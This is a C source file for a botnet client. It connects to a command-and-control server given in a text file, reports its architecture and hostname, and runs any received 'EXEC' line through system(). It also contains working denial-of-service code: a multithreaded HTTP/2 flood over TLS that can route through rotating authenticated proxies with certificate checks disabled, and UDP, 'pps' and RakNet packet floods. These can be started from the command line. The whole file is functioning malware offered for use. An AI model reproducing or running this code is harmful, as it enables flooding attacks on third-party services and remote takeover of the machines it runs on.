#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

typedef struct ssl_ctx_st SSL_CTX;
typedef struct ssl_method_st SSL_METHOD;
typedef struct ssl_st SSL;

extern const SSL_METHOD *TLS_client_method(void);
extern SSL_CTX *SSL_CTX_new(const SSL_METHOD *method);
extern void SSL_CTX_free(SSL_CTX *ctx);
extern void SSL_CTX_set_verify(SSL_CTX *ctx, int mode, void *cb);
extern long SSL_CTX_ctrl(SSL_CTX *ctx, int cmd, long larg, void *parg);
extern SSL *SSL_new(SSL_CTX *ctx);
extern int SSL_set_fd(SSL *ssl, int fd);
extern int SSL_connect(SSL *ssl);
extern int SSL_write(SSL *ssl, const void *buf, int num);
extern int SSL_read(SSL *ssl, void *buf, int num);
extern void SSL_free(SSL *ssl);
extern long SSL_ctrl(SSL *ssl, int cmd, long larg, void *parg);

#define SSL_VERIFY_NONE 0
#define SSL_CTRL_MODE 33
#define SSL_CTRL_SET_TLSEXT_HOSTNAME 55
#define TLSEXT_NAMETYPE_host_name 0
#define SSL_MODE_AUTO_RETRY 0x00000004

static long ssl_ctx_set_mode(SSL_CTX *ctx, long mode) {
	return SSL_CTX_ctrl(ctx, SSL_CTRL_MODE, mode, NULL);
}

static long ssl_set_host_name(SSL *ssl, const char *name) {
	return SSL_ctrl(ssl, SSL_CTRL_SET_TLSEXT_HOSTNAME, TLSEXT_NAMETYPE_host_name, (void *)name);
}

#define DEFAULT_ADDRESS "localhost:8080"
#define BEAT_INTERVAL 15
#define RETRY_USLEEP 500
#define LINE_MAX 4096
#define SYNC_INTERVAL 30
#define MAX_PROXIES 4096

static char gtx_line[LINE_MAX];
static size_t gtx_len;
static pthread_mutex_t g_proxy_mu = PTHREAD_MUTEX_INITIALIZER;
static size_t g_proxy_count;
static size_t g_proxy_next;

typedef struct {
	char ip[64];
	char port[16];
	char auth[256];
} proxy_t;

static proxy_t g_proxies[MAX_PROXIES];

static void retry_pause(void) {
	struct timespec ts;
	ts.tv_sec = 0;
	ts.tv_nsec = RETRY_USLEEP * 1000;
	nanosleep(&ts, NULL);
}

static const char *arch_name(void) {
#if defined(__x86_64__) || defined(_M_X64)
	return "x86_64";
#elif defined(__i386__) || defined(_M_IX86)
	return "x86";
#elif defined(__aarch64__) || defined(_M_ARM64)
	return "arm64";
#elif defined(__arm__) || defined(_M_ARM)
	return "arm";
#elif defined(__mips__) || defined(__mips64__)
	return "mips";
#else
	return "unknown";
#endif
}

static const char *machine_name(void) {
	static char h[256];
	if (gethostname(h, sizeof h) == 0) {
		return h;
	}
	return "bot";
}

static const char *read_address(void) {
	static char addr[256];
	const char *files[] = {"address.txt", "abots/address.txt"};
	for (size_t i = 0; i < sizeof files / sizeof files[0]; i++) {
		FILE *fp = fopen(files[i], "r");
		if (!fp) {
			continue;
		}
		if (fgets(addr, sizeof addr, fp)) {
			fclose(fp);
			addr[strcspn(addr, "\r\n")] = '\0';
			if (addr[0] != '\0') {
				return addr;
			}
		} else {
			fclose(fp);
		}
	}
	return DEFAULT_ADDRESS;
}

static int slurp(const char *path, char *buf, size_t bufsz) {
	FILE *fp = fopen(path, "r");
	if (!fp) {
		return 0;
	}
	size_t n = 0;
	int c;
	while (n < bufsz - 1 && (c = fgetc(fp)) != EOF) {
		buf[n++] = (char)c;
	}
	buf[n] = '\0';
	fclose(fp);
	return (int)n;
}

static void base64_encode(const char *in, size_t len, char *out) {
	static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	size_t o = 0;
	size_t i = 0;
	while (i + 3 <= len) {
		uint32_t v = ((uint32_t)(unsigned char)in[i] << 16) |
			     ((uint32_t)(unsigned char)in[i + 1] << 8) |
			     (uint32_t)(unsigned char)in[i + 2];
		out[o++] = tbl[(v >> 18) & 63];
		out[o++] = tbl[(v >> 12) & 63];
		out[o++] = tbl[(v >> 6) & 63];
		out[o++] = tbl[v & 63];
		i += 3;
	}
	size_t rem = len - i;
	if (rem == 1) {
		uint32_t v = (uint32_t)(unsigned char)in[i] << 16;
		out[o++] = tbl[(v >> 18) & 63];
		out[o++] = tbl[(v >> 12) & 63];
		out[o++] = '=';
		out[o++] = '=';
	} else if (rem == 2) {
		uint32_t v = ((uint32_t)(unsigned char)in[i] << 16) | ((uint32_t)(unsigned char)in[i + 1] << 8);
		out[o++] = tbl[(v >> 18) & 63];
		out[o++] = tbl[(v >> 12) & 63];
		out[o++] = tbl[(v >> 6) & 63];
		out[o++] = '=';
	}
	out[o] = '\0';
}

static void load_proxies(void) {
	const char *files[] = {"abots/c/proxy/ips.txt", "proxy/ips.txt", "ips.txt"};
	char buf[65536];
	int got = 0;
	for (size_t i = 0; i < sizeof files / sizeof files[0] && !got; i++) {
		if (slurp(files[i], buf, sizeof buf)) {
			got = 1;
		}
	}
	size_t count = 0;
	if (got) {
		char *save = NULL;
		for (char *line = strtok_r(buf, "\r\n", &save); line && count < MAX_PROXIES; line = strtok_r(NULL, "\r\n", &save)) {
			if (line[0] == '\0') {
				continue;
			}
			char *fields[4] = {NULL, NULL, NULL, NULL};
			char *p = line;
			int f = 0;
			while (f < 4 && p) {
				char *colon = strchr(p, ':');
				if (colon) {
					*colon = '\0';
					fields[f++] = p;
					p = colon + 1;
				} else {
					fields[f++] = p;
					p = NULL;
				}
			}
			if (!fields[0] || !fields[1]) {
				continue;
			}
			proxy_t *px = &g_proxies[count];
			snprintf(px->ip, sizeof px->ip, "%s", fields[0]);
			snprintf(px->port, sizeof px->port, "%s", fields[1]);
			if (fields[2] && fields[3]) {
				char cred[128];
				snprintf(cred, sizeof cred, "%s:%s", fields[2], fields[3]);
				char b64[192];
				base64_encode(cred, strlen(cred), b64);
				snprintf(px->auth, sizeof px->auth, "Basic %s", b64);
			} else {
				px->auth[0] = '\0';
			}
			count++;
		}
	}
	pthread_mutex_lock(&g_proxy_mu);
	g_proxy_count = count;
	g_proxy_next = 0;
	pthread_mutex_unlock(&g_proxy_mu);
	printf("[bot] loaded %zu proxies\n", count);
	fflush(stdout);
}

static proxy_t *next_proxy(void) {
	pthread_mutex_lock(&g_proxy_mu);
	if (g_proxy_count == 0) {
		pthread_mutex_unlock(&g_proxy_mu);
		return NULL;
	}
	proxy_t *px = &g_proxies[g_proxy_next % g_proxy_count];
	g_proxy_next++;
	pthread_mutex_unlock(&g_proxy_mu);
	return px;
}

static int connect_host(const char *host, const char *port) {
	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if (getaddrinfo(host, port, &hints, &res) != 0) {
		return -1;
	}
	int fd = -1;
	for (struct addrinfo *p = res; p; p = p->ai_next) {
		fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		if (fd < 0) {
			continue;
		}
		if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) {
			break;
		}
		close(fd);
		fd = -1;
	}
	freeaddrinfo(res);
	return fd;
}

static int http_connect(int fd, const proxy_t *px, const char *host, const char *port) {
	char req[512];
	snprintf(req, sizeof req, "CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n", host, port, host, port);
if (px->auth[0]) {
			char hdr[320];
			snprintf(hdr, sizeof hdr, "Proxy-Authorization: %s\r\n", px->auth);
			strncat(req, hdr, sizeof req - strlen(req) - 1);
		}
	strncat(req, "\r\n", sizeof req - strlen(req) - 1);
	if (write(fd, req, strlen(req)) < 0) {
		return -1;
	}
	char buf[2048];
	size_t n = 0;
	while (n < sizeof buf - 1) {
		ssize_t r = read(fd, buf + n, 1);
		if (r <= 0) {
			return -1;
		}
		n++;
		buf[n] = '\0';
		if (n >= 4 && memcmp(buf + n - 4, "\r\n\r\n", 4) == 0) {
			break;
		}
	}
	buf[n] = '\0';
	return strstr(buf, " 200") != NULL || strncmp(buf, "HTTP/1.1 200", 12) == 0 || strncmp(buf, "HTTP/1.0 200", 12) == 0;
}

static SSL_CTX *tls_ctx(void) {
	static SSL_CTX *ctx;
	if (!ctx) {
		ctx = SSL_CTX_new(TLS_client_method());
		if (ctx) {
SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
		ssl_ctx_set_mode(ctx, SSL_MODE_AUTO_RETRY);
		}
	}
	return ctx;
}

static SSL *tls_handshake(int fd, const char *host) {
	SSL_CTX *ctx = tls_ctx();
	if (!ctx) {
		return NULL;
	}
	SSL *ssl = SSL_new(ctx);
	if (!ssl) {
		return NULL;
	}
	SSL_set_fd(ssl, fd);
	ssl_set_host_name(ssl, host);
	if (SSL_connect(ssl) != 1) {
		SSL_free(ssl);
		return NULL;
	}
	return ssl;
}

static void h2_flood(SSL *ssl, time_t end) {
	static const unsigned char preface[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
	SSL_write(ssl, preface, (int)sizeof preface - 1);
	unsigned char settings[9] = {0, 0, 0, 0, 4, 0, 0, 0, 0};
	SSL_write(ssl, settings, 9);
	unsigned int rnd = (unsigned int)time(NULL);
	unsigned char frame[40];
	while (time(NULL) < end) {
		rnd = rnd * 1664525u + 1013904223u;
		int off = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 4;
		frame[off++] = 8;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 0;
		frame[off++] = 1;
		frame[off++] = (unsigned char)(rnd >> 24);
		frame[off++] = (unsigned char)(rnd >> 16);
		frame[off++] = (unsigned char)(rnd >> 8);
		frame[off++] = (unsigned char)rnd;
		if (SSL_write(ssl, frame, off) <= 0) {
			break;
		}
		char buf[512];
		if (SSL_read(ssl, buf, sizeof buf) <= 0) {
			break;
		}
	}
}

typedef struct {
	char host[256];
	char port[16];
	time_t end;
	int use_proxy;
	int threads;
} l7arg_t;

static void *l7_worker(void *p) {
	l7arg_t *a = p;
	while (time(NULL) < a->end) {
		int fd = -1;
		proxy_t *px = NULL;
		if (a->use_proxy) {
			px = next_proxy();
			if (!px) {
				retry_pause();
				continue;
			}
			fd = connect_host(px->ip, px->port);
			if (fd < 0) {
				continue;
			}
			if (http_connect(fd, px, a->host, a->port) < 0) {
				close(fd);
				continue;
			}
		} else {
			fd = connect_host(a->host, a->port);
			if (fd < 0) {
				continue;
			}
		}
		SSL *ssl = tls_handshake(fd, a->host);
		if (!ssl) {
			close(fd);
			continue;
		}
		h2_flood(ssl, a->end);
		SSL_free(ssl);
		close(fd);
	}
	(void)a->threads;
	return NULL;
}

static void l7_attack(const char *host, const char *port, int secs, int use_proxy) {
	l7arg_t arg;
	snprintf(arg.host, sizeof arg.host, "%s", host);
	snprintf(arg.port, sizeof arg.port, "%s", port);
	arg.end = time(NULL) + secs;
	arg.use_proxy = use_proxy;
	arg.threads = 24;
	if (!use_proxy) {
		arg.threads = 32;
	}
	int threads = arg.threads;
	pthread_t t[40];
	printf("[c] %s attack started on %s:%s for %ds (%d threads)\n",
	       use_proxy ? "tls" : "raw", host, port, secs, threads);
	fflush(stdout);
	for (int i = 0; i < threads; i++) {
		if (pthread_create(&t[i], NULL, l7_worker, &arg) != 0) {
			threads = i;
			break;
		}
	}
	for (int i = 0; i < threads; i++) {
		pthread_join(t[i], NULL);
	}
	printf("[c] attack finished\n");
	fflush(stdout);
}

static int udp_path(const char *host, const char *port, struct sockaddr_storage *out, socklen_t *outlen) {
	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_DGRAM;
	if (getaddrinfo(host, port, &hints, &res) != 0) {
		return -1;
	}
	int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	if (fd < 0) {
		freeaddrinfo(res);
		return -1;
	}
	memcpy(out, res->ai_addr, res->ai_addrlen);
	*outlen = (socklen_t)res->ai_addrlen;
	freeaddrinfo(res);
	return fd;
}

static void udp_flood(const char *host, const char *port, int secs, const char *method) {
	struct sockaddr_storage sa;
	socklen_t salen;
	int fd = udp_path(host, port, &sa, &salen);
	if (fd < 0) {
		printf("[c] %s: cannot resolve %s\n", method, host);
		return;
	}
	unsigned char payload[512];
	size_t plen = 64;
	if (strcmp(method, "raknet") == 0) {
		static const unsigned char magic[] = {0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
						       0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78};
		memcpy(payload, magic, sizeof magic);
		plen = sizeof magic;
	} else {
		for (size_t i = 0; i < plen; i++) {
			payload[i] = (unsigned char)i;
		}
	}
	time_t end = time(NULL) + secs;
	printf("[c] %s attack started on %s:%s for %ds\n", method, host, port, secs);
	fflush(stdout);
	while (time(NULL) < end) {
		if (sendto(fd, payload, plen, 0, (struct sockaddr *)&sa, salen) < 0) {
			if (errno != EAGAIN && errno != EWOULDBLOCK) {
				break;
			}
		}
	}
	printf("[c] attack finished\n");
	fflush(stdout);
	close(fd);
}

static void run_attack(const char *method, const char *host, const char *port, const char *dur) {
	int secs = atoi(dur);
	if (secs <= 0) {
		return;
	}
	if (strcmp(method, "tls") == 0) {
		load_proxies();
		const char *h = host;
		char hn[256];
		if (strncmp(host, "https://", 8) == 0) {
			snprintf(hn, sizeof hn, "%s", host + 8);
			char *slash = strchr(hn, '/');
			if (slash) {
				*slash = '\0';
			}
			char *colon = strchr(hn, ':');
			if (colon) {
				*colon = '\0';
			}
			h = hn;
		}
		l7_attack(h, port, secs, 1);
	} else if (strcmp(method, "raw") == 0) {
		const char *h = host;
		char hn[256];
		if (strncmp(host, "https://", 8) == 0) {
			snprintf(hn, sizeof hn, "%s", host + 8);
			char *slash = strchr(hn, '/');
			if (slash) {
				*slash = '\0';
			}
			char *colon = strchr(hn, ':');
			if (colon) {
				*colon = '\0';
			}
			h = hn;
		}
		l7_attack(h, port, secs, 0);
	} else if (strcmp(method, "udp") == 0 || strcmp(method, "pps") == 0 || strcmp(method, "raknet") == 0) {
		udp_flood(host, port, secs, method);
	}
}

static void run_command(const char *cmd) {
	printf("[bot] executing: %s\n", cmd);
	fflush(stdout);
	int rc = system(cmd);
	if (rc != 0) {
		printf("[bot] exec failed: %d\n", rc);
		return;
	}
	printf("[bot] done\n");
	fflush(stdout);
}

static void handle_line(char *line) {
	long len = (long)strlen(line);
	while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
		line[--len] = '\0';
	}
	if (strncmp(line, "EXEC ", 5) == 0) {
		run_command(line + 5);
	}
}

static void feed_byte(char ch) {
	if (ch == '\n') {
		gtx_line[gtx_len] = '\0';
		handle_line(gtx_line);
		gtx_len = 0;
		return;
	}
	if (gtx_len < LINE_MAX - 1) {
		gtx_line[gtx_len++] = ch;
	}
}

static int connect_c2(const char *hostport) {
	char host[256], port[16];
	size_t n = strlen(hostport);
	const char *colon = NULL;
	for (size_t i = 0; i < n; i++) {
		if (hostport[i] == ':') {
			colon = &hostport[i];
			break;
		}
	}
	if (!colon) {
		return -1;
	}
	size_t hl = (size_t)(colon - hostport);
	if (hl >= sizeof host) {
		return -1;
	}
	memcpy(host, hostport, hl);
	host[hl] = '\0';
	snprintf(port, sizeof port, "%s", colon + 1);
	return connect_host(host, port);
}

static int heartbeat(int fd) {
	char ident[512];
	snprintf(ident, sizeof ident, "BEAT %s %s\n", arch_name(), machine_name());
	if (write(fd, ident, strlen(ident)) < 0) {
		return -1;
	}
	while (1) {
		fd_set rfds;
		FD_ZERO(&rfds);
		FD_SET(fd, &rfds);
		struct timeval tv = {BEAT_INTERVAL, 0};
		int ready = select(fd + 1, &rfds, NULL, NULL, &tv);
		if (ready < 0) {
			if (errno == EINTR) {
				continue;
			}
			return -1;
		}
		if (ready == 0) {
			if (write(fd, "PING\n", 5) < 0) {
				return -1;
			}
			continue;
		}
		char buf[512];
		ssize_t r = recv(fd, buf, sizeof buf, 0);
		if (r < 0) {
			return -1;
		}
		if (r == 0) {
			errno = ENOTCONN;
			return -1;
		}
		for (ssize_t i = 0; i < r; i++) {
			feed_byte(buf[i]);
		}
	}
}

int main(int argc, char **argv) {
	if (argc >= 5) {
		run_attack(argv[1], argv[2], argv[3], argv[4]);
		return 0;
	}
	signal(SIGPIPE, SIG_IGN);
	char addr[256];
	const char *initial = read_address();
	strncpy(addr, initial, sizeof addr - 1);
	addr[sizeof addr - 1] = '\0';
	printf("[bot] heartbeat target: %s\n", addr);
	fflush(stdout);
	time_t last_sync = 0;
	for (;;) {
		if (difftime(time(NULL), last_sync) > SYNC_INTERVAL) {
			last_sync = time(NULL);
			const char *cur = read_address();
			if (strcmp(cur, addr) != 0) {
				printf("[bot] address updated to %s\n", cur);
				fflush(stdout);
				strncpy(addr, cur, sizeof addr - 1);
				addr[sizeof addr - 1] = '\0';
			}
		}
		int fd = connect_c2(addr);
		if (fd < 0) {
			printf("[bot] heartbeat lost on %s: %s\n", addr, strerror(errno));
			fflush(stdout);
			retry_pause();
			continue;
		}
		printf("[bot] connected to %s\n", addr);
		fflush(stdout);
		if (heartbeat(fd) < 0) {
			printf("[bot] heartbeat lost on %s: %s\n", addr, strerror(errno));
			fflush(stdout);
		}
		close(fd);
		retry_pause();
	}
}